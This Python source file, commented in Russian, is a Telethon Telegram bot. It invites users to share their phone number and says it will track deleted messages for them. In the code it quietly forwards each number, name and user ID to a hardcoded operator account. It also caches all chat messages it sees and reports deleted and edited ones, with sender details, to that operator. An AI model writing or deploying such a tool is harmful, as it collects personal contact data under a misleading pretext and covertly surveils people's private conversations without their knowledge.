import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.custom import Button
from telethon.tl.types import Message, MessageService

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Данные из секретов
BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

# ID пользователя, которому отправлять уведомления (твой ID)
YOUR_USER_ID = 7396285844  # Мику скуп

# Создаем клиента
bot = TelegramClient('bot', API_ID, API_HASH)

# Хранилище последних сообщений для отслеживания удалений
message_cache = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Приветствие с кнопкой отправки номера"""
    await event.reply(
        "✅ **Бот запущен!**\n\n"
        "Нажми кнопку ниже, чтобы отправить свой номер телефона:",
        buttons=[[Button.text("📱 Отправить номер", resize=True)]]
    )
    logger.info(f"Пользователь {event.sender_id} запустил бота")

@bot.on(events.NewMessage)
async def text_handler(event):
    """Обработка текстовых сообщений"""
    if event.message.text == "📱 Отправить номер":
        # Показываем кнопку для отправки контакта
        await event.reply(
            "📞 **Поделись своим номером:**\n\n"
            "Нажми кнопку ниже, чтобы бот получил твой номер телефона:",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        logger.info(f"Пользователь {event.sender_id} запросил отправку номера")

@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    """Получение контакта (номера телефона)"""
    contact = event.message.contact
    user_id = event.sender_id
    phone = contact.phone_number
    first_name = contact.first_name or "не указано"
    
    # Отправляем подтверждение
    await event.reply(
        f"✅ **Номер получен!**\n\n"
        f"📱 Телефон: `{phone}`\n"
        f"👤 Имя: {first_name}\n\n"
        f"Спасибо! Теперь бот будет следить за удалёнными сообщениями."
    )
    
    # Отправляем себе уведомление о новом контакте
    await bot.send_message(
        YOUR_USER_ID,
        f"📱 **Новый контакт!**\n\n"
        f"👤 Пользователь: {user_id}\n"
        f"📞 Телефон: {phone}\n"
        f"👤 Имя: {first_name}"
    )
    
    logger.info(f"Получен контакт от {user_id}: {phone}")

@bot.on(events.MessageDeleted)
async def deleted_handler(event):
    """Отслеживание удалённых сообщений"""
    chat_id = event.chat_id
    deleted_ids = event.deleted_ids
    
    # Получаем информацию о чате
    try:
        chat = await bot.get_entity(chat_id)
        chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Неизвестный чат'))
    except:
        chat_name = "Неизвестный чат"
    
    # Для каждого удалённого сообщения
    for msg_id in deleted_ids:
        # Проверяем, есть ли сообщение в кэше
        cache_key = f"{chat_id}_{msg_id}"
        if cache_key in message_cache:
            msg_data = message_cache[cache_key]
            sender_name = msg_data.get('sender', 'Неизвестно')
            msg_text = msg_data.get('text', 'Нет текста')
            msg_time = msg_data.get('time', '')
            
            # Формируем уведомление
            alert = (
                f"🗑 **УДАЛЕНО СООБЩЕНИЕ**\n\n"
                f"📌 Чат: {chat_name}\n"
                f"👤 Отправитель: {sender_name}\n"
                f"⏰ Время: {msg_time}\n"
                f"📝 Текст: {msg_text}\n"
                f"🆔 ID: {msg_id}"
            )
            
            # Отправляем уведомление
            await bot.send_message(YOUR_USER_ID, alert)
            logger.info(f"Уведомление об удалении из чата {chat_name}")
            
            # Удаляем из кэша
            del message_cache[cache_key]

@bot.on(events.MessageEdited)
async def edited_handler(event):
    """Отслеживание изменённых сообщений"""
    message = event.message
    chat_id = event.chat_id
    
    # Получаем информацию о чате
    try:
        chat = await bot.get_entity(chat_id)
        chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Неизвестный чат'))
    except:
        chat_name = "Неизвестный чат"
    
    # Получаем информацию об отправителе
    try:
        sender = await event.get_sender()
        sender_name = getattr(sender, 'first_name', 'Неизвестно')
        if hasattr(sender, 'last_name') and sender.last_name:
            sender_name += f" {sender.last_name}"
        if hasattr(sender, 'username') and sender.username:
            sender_name += f" (@{sender.username})"
    except:
        sender_name = "Неизвестно"
    
    # Сохраняем в кэш для отслеживания удалений
    cache_key = f"{chat_id}_{message.id}"
    message_cache[cache_key] = {
        'sender': sender_name,
        'text': message.text or "[Медиа]",
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Формируем уведомление об изменении
    alert = (
        f"✏️ **ИЗМЕНЕНО СООБЩЕНИЕ**\n\n"
        f"📌 Чат: {chat_name}\n"
        f"👤 Отправитель: {sender_name}\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"📝 Новый текст: {message.text or '[Медиа]'}\n"
        f"🆔 ID: {message.id}"
    )
    
    # Отправляем уведомление
    await bot.send_message(YOUR_USER_ID, alert)
    logger.info(f"Уведомление об изменении из чата {chat_name}")

@bot.on(events.NewMessage)
async def cache_handler(event):
    """Кэшируем все новые сообщения для отслеживания удалений"""
    if not event.message.text and not event.message.media:
        return
    
    chat_id = event.chat_id
    msg_id = event.message.id
    
    # Получаем информацию об отправителе
    try:
        sender = await event.get_sender()
        sender_name = getattr(sender, 'first_name', 'Неизвестно')
        if hasattr(sender, 'last_name') and sender.last_name:
            sender_name += f" {sender.last_name}"
        if hasattr(sender, 'username') and sender.username:
            sender_name += f" (@{sender.username})"
    except:
        sender_name = "Неизвестно"
    
    # Сохраняем в кэш
    cache_key = f"{chat_id}_{msg_id}"
    message_cache[cache_key] = {
        'sender': sender_name,
        'text': event.message.text or "[Медиа]",
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Ограничиваем размер кэша (последние 1000 сообщений)
    if len(message_cache) > 1000:
        # Удаляем самые старые записи
        keys_to_remove = list(message_cache.keys())[:200]
        for key in keys_to_remove:
            del message_cache[key]

async def main():
    """Запуск бота"""
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен!")
    logger.info(f"👤 Уведомления будут отправляться пользователю {YOUR_USER_ID}")
    
    # Отправляем уведомление о запуске
    await bot.send_message(
        YOUR_USER_ID,
        "✅ **Бот запущен!**\n\n"
        "📋 **Функции:**\n"
        "• Получение номера телефона\n"
        "• Отслеживание удалённых сообщений\n"
        "• Отслеживание изменённых сообщений\n"
        "• Уведомления в реальном времени"
    )
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
    except Exception as e:
        logger.error(f"Ошибка: {e}")